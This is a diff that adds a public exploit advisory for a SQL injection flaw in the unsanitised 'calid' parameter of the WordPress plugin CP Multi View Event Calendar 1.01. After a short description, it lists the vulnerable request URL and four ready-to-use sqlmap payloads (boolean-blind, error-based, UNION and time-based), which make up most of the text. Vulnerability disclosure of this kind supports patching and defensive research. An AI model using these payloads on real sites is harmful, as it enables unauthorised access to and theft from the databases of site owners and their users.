@@ -1,0 +1,67 @@
+######################
+
+# Exploit Title : CP Multi View Event Calendar 1.01 SQL Injection Vulnerability
+
+# Exploit Author : Claudio Viviani 
+
+# Software Link : https://downloads.wordpress.org/plugin/cp-multi-view-calendar.zip
+
+# Date : 2014-10-23
+
+# Tested on : Windows 7 / Mozilla Firefox
+              Windows 7 / sqlmap (0.8-1)
+              Linux / Mozilla Firefox
+              Linux / sqlmap 1.0-dev-5b2ded0
+
+######################
+
+
+# Description
+
+CP Multi View Event Calendar 1.01 suffers from SQL injection vulnerability
+
+calid variable is not sanitized.
+
+######################
+
+# PoC
+
+http://localhost/?cpmvc_id=1&cpmvc_do_action=mvparse&f=datafeed&method=list&calid=1 [Sqli]
+
+# Sqlmap
+
+---
+Place: GET
+Parameter: calid
+    Type: boolean-based blind
+    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)
+    Payload: cpmvc_id=1&cpmvc_do_action=mvparse&f=datafeed&method=list&calid=1 RLIKE (SELECT (CASE WHEN (9095=9095) THEN 1 ELSE 0x28 END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: cpmvc_id=1&cpmvc_do_action=mvparse&f=datafeed&method=list&calid=1 AND (SELECT 3807 FROM(SELECT COUNT(*),CONCAT(0x7171736971,(SELECT (CASE WHEN (3807=3807) THEN 1 ELSE 0 END)),0x716b716671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 14 columns
+    Payload: cpmvc_id=1&cpmvc_do_action=mvparse&f=datafeed&method=list&calid=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171736971,0x6f7642724e6743615973,0x716b716671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+
+    Type: AND/OR time-based blind
+    Title: MySQL < 5.0.12 AND time-based blind (heavy query)
+    Payload: cpmvc_id=1&cpmvc_do_action=mvparse&f=datafeed&method=list&calid=1 AND 8168=BENCHMARK(5000000,MD5(0x4a4a6d41))
+---
+
+
+#####################
+
+Discovered By : Claudio Viviani
+                http://www.homelab.it
+		
+                info@homelab.it
+                homelabit@protonmail.ch
+
+                https://www.facebook.com/homelabit
+                https://twitter.com/homelabit
+                https://plus.google.com/+HomelabIt1/
+                https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+#####################
